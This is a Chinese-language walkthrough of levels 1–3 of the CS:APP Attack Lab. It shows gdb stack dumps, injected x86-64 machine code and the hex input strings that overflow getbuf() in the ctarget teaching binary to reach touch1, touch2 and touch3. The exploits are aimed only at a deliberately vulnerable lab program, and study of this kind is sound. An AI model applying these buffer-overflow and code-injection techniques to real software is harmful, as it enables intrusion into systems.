### 实验3 攻击实验
***
## LeveL 1
通过阅读README.md文件，了解我们的任务，`test()`函数中调用了`getbuf()`函数，我们希望在执行完`getbuf()`函数后不要返回`test()`函数，而是返回到`touch1()`函数。

`unix> objdump -d ctarget > ctarget.s`命令可以将`ctarget`文件反汇编成汇编代码。

先找到`touch1()`的函数地址，`00000000004017c0`     

调用`hex2raw`将把文本形式的十六进制字符串，转换成真正的二进制原始字节流。   
`unix> ./hex2raw < exploit.txt > exploit-raw.txt`
 
这样就可以在GDB调试中，将原始字符串存储在一个文件中，并以命令行参数的形式提供文件名
```
unix> gdb ctarget
(gdb) run -q < exploit-raw.txt (-q是为了关闭notify)
```
我们使用GDB调速器，在调用`getbuf()`函数中的`Gets()`设置一个断点，查看输入字符串后栈的情况。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x0000000000004443
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000009      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
可以看到0x5561dca0地址处的值就是返回地址，我们只要通过字符串输入溢出用touch1()函数的地址覆盖掉这个返回地址，就可以实现攻击了。
 
我们修改一下exploit.txt文件
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 c0
```
尝试运行
```
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004017bd in getbuf () at buf.c:16
16      in buf.c
(gdb) continue
Continuing.
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 C0 
[Inferior 1 (process 5721) exited with code 01]
```
发生了报错，我们重新打一下调点看看修改输入文件后栈的值是否和我们期望中的一样。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x4241353433323130
0x5561dc88:     0x4241353433323130      0x4241353433323130
0x5561dc98:     0x4241353433323130      0xc017400000000000
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
发现我们输入的返回地址反了😄(Linux是小端法，即低位字节放在地址小的地方)，我们重新修改一下输入文件的值再次尝试。
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 c0 17 40 00 00 00 00 00
```
```
(gdb) run -q < exploit-raw.txt
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 C0 17 40 00 00 00 00 00 
[Inferior 1 (process 8439) exited normally]
```
可以看到我们成功调用了`touch1()`函数，完成了攻击实验的第一级。

## LeveL 2

阅读一下README文件，查看一下我们的目标，我们需要返回到`touch2()`函数，并且设置好cookie的值。我们查看`touch2()`函数的地址,修改我们的exploit.txt文件。
`00000000004017ec`

查看`touch2()`的汇编代码
```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
```
我们需要使寄存器`%rdi`的值等于cookie的值。我们设置好`touch2()`的返回地址后，打断点查看一下cookie的值和%rdi的值
```
(gdb) p/x $edi
$8 = 0xf7fb6980
(gdb) x/16gx 0x202ce2+$rip
0x6044e4 <cookie>:      0x0000000059b997fa      0x0000000000000000
0x6044f4:       0x0000000000000000      0x3320303300000000
0x604504 <gets_buf+4>:  0x2033332032332031      0x3134203533203433
0x604514 <gets_buf+20>: 0x3320303320323420      0x2033332032332031
0x604524 <gets_buf+36>: 0x3134203533203433      0x3320303320323420
0x604534 <gets_buf+52>: 0x2033332032332031      0x3134203533203433
0x604544 <gets_buf+68>: 0x3320303320323420      0x2033332032332031
0x604554 <gets_buf+84>: 0x3134203533203433      0x3320303320323420
```
我们研究一下怎么修改%rdi的值使其等于cookie,先看一下%rdi的值是怎么来的，研究汇编代码发现，在调用`touch2()`函数之前，`%rdi`的值由`Gets()`函数设置的。
```assembly
401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
```
```(gdb) x/x 0x202a62+0x401a6e
0x6044d0 <infile>:      0x00007ffff7fb6980
```
修改%rdi的值需要注入代码来修改%rdi的值，我们可以在输入字符串中注入下列代码(这里为什么要使用pushq指令呢？因为我们需要在修改%rdi的值后返回到`touch2()`函数，所以我们需要将`touch2()`函数的地址压入栈中，然后使用ret指令返回到`touch2()`函数)。    
***
同时涉及到一个栈对齐的问题，**Linux系统要求栈必须是16字节对齐的**，我们发现，在进入`getbuf()`函数的时候，`sub    $0x28,%rsp`,而我们并没有正常返回(即%rsp没有加回来)，而是返回到了`touch2()`函数，`touch2()`函数中有一条单独的指令`sub $0x8, %rsp`，也就是说，在我们没有注入代码之前，这个%rsp = 0x28 - 0x8 = 0x20,是16字节对齐的，而我们注入的代码包含了`ret`指令,而`ret`指令的本质是`%rip = *rsp++,jmp %rip`，也就是说在执行完`ret`指令后，%rsp会加8字节，所以我们需要保证在执行完`ret`指令后，%rsp仍然是16字节对齐的，而`pushq`指令会将%rsp减8字节，所以我们需要在注入的代码中使用`pushq`指令来保证栈的对齐。
***
   
通过注入下列代码
```assembly
mov $cookie, %rdi
pushq $0x4017ec
ret 
```
的机器码来修改%rdi的值。怎么得到这个机器码呢？我们先编写一段需要注入的汇编代码
```assembly
.text                   #代码（指令）
.globl _start           #全局符号_start，链接器从这里开始执行
_start:                 #程序入口
mov $0x59b997fa, %rdi   #将cookie的值放入rdi寄存器
pushq $0x4017ec         #将touch2函数的地址压入栈中
ret                     #返回到touch2函数
```
先生成目标文件，然后再反汇编查看机器码
```
unix> as --64 -o tmp.o tmp.s
unix> objdump -d tmp.o

tmp.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq                      retq
```
可以得到我们需要注入的代码为`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`，我们将这个机器码注入到输入字符串中，并且设置好返回地址为这个栈地址，就可以运行我们注入的代码来修改%rdi的值了。 
***
下面为完整的输入字符串
```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00  

```
运行结果
```
(gdb) run -q < exploit-raw.txt
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
[Inferior 1 (process 34464) exited normally]
```
## Level 3

任务跟前面的LeveL一样，需要回到`touch3()`函数，而不是返回到`test()`函数，同时还涉及`hexmatch()`函数，下面两个函数c语言代码如下:
```c
/* Compare string to hes represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
        vlevel = 3; /* Part of validation protocol */
        if (hexmatch(cookie, sval))
        {
                printf("Touch3!: You called touch3(\"%s\")\n", sval);
        }
        else {
                printf("Misfire: You called touch3(\"%s\")\n", sval);
                fail(3);
        }
        exit(0);
}
```
通过研究`hexmatch() touch3() getbuf()`函数，首先`touch3()`函数的`char *sval`参数是**LeveL 2**中提到的`%rdi`寄存器的值(由infile定义)，而`hexmatch()`函数将`cookie`值放在cbuf数组的一个随机位置，并且将这个位置的地址赋值给`s`指针，然后将`s`指针指向的字符串与`sval`进行比较，也就是说，我们需要将cookie值在进入`touch3()`函数之前注入到输入字符串中，这样才能成功调用`touch3()`函数。

先找到`touch3()`函数的地址
`00000000004018fa`   
我们将断点打在`hexmatch()`函数调用之前，看看输入参数的情况。
```
(gdb) p/x $rdi
$2 = 0x59b997fa
(gdb) p/x $rsi
$3 = 0x7ffff7fb6980
```
猜测我们只需要像level2那样就行注入代码攻击即可成功，尝试一下。
```
0000000000000000 <_start>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```
不出意外报错了,通过在`hexmatch()`函数入口打断点调试发现
```
hexmatch (val=1505335290, 
    sval=sval@entry=0x59b997fa <error: Cannot access memory at address 0x59b997fa>) at visible.c:62
62      in visible.c
```
发现`hexmatch()`函数的第二个参数`sval`的值是我们注入的cookie值，而不是一个字符串，所以我们需要将cookie值转换成字符串的形式注入到输入字符串中，这样才能成功调用`hexmatch()`函数.
```assembly
.text                   # 代码（指令）
.globl _start           # 全局符号_start，链接器从这里开始执行
_start:                 # 程序入口
leaq str(%rip), %rdi    # 把字符串地址放 rdi
pushq $0x4018fa         # 将touch3函数的地址压入栈中
ret                     # 返回到touch3函数

str:
    .string "59b997fa"
```
```
0000000000000000 <_start>:
   0:   48 8d 3d 06 00 00 00    lea    0x6(%rip),%rdi        # d <str>
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq   

000000000000000d <str>:
   d:   35 39 62 39 39          xor    $0x39396239,%eax
  12:   37                      (bad)  
  13:   66 61                   data16 (bad)
```
```
48 8d 3d 06 00 00 00 68 fa 18 40 00 c3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```
又报错了   
```
root@LAPTOP-0PTH5R3A:/home/emilia/emilia/csapplab/attacklab/target1# ./ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Misfire: You called touch3("")
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:3:48 8D 3D 06 00 00 00 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

我们注入的字符串没有成功传递到`touch3()`函数中，经过调试发现：    
- 我把注入代码入口覆盖成了 0x5561dc78（最后 8 字节）。
- 代码里 leaq str(%rip), %rdi 得到的 str 大约是 0x5561dc85（代码后面紧跟字符串）。
- 但执行 ret 跳到 touch3 之前，%rsp 已经回到调用者栈顶（约 0x5561dca8 一带）。
- touch3 -> hexmatch -> sprintf/strncmp 会继续在栈上分配和写入，覆盖 %rsp 以下地址。
- 我的字符串地址 0x5561dc85 在 %rsp 以下，所以很容易被踩坏，hexmatch 比较时就失败。

所以只需要将字符串的位置放置在返回地址的上面就可以了，修改一下输入文件的值再次尝试。
```
0000000000000000 <_start>:
           0:   48 89 e7                mov    %rsp,%rdi
           3:   68 fa 18 40 00          pushq  $0x4018fa
           8:   c3                      retq   
        ...

000000005561dca8 <my_str>:
    5561dca8:   35 39 62 39 39          xor    $0x39396239,%eax
    5561dcad:   37                      (bad)  
    5561dcae:   66 61                   data16 (bad)
```

```
48 89 e7 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```
```
Continuing.
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 89 E7 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
[Inferior 1 (process 32849) exited normally]
```
可以发现我们成功调用了`touch3()`函数，并且成功通过了`hexmatch()`函数的验证，完成了攻击实验的第三级。






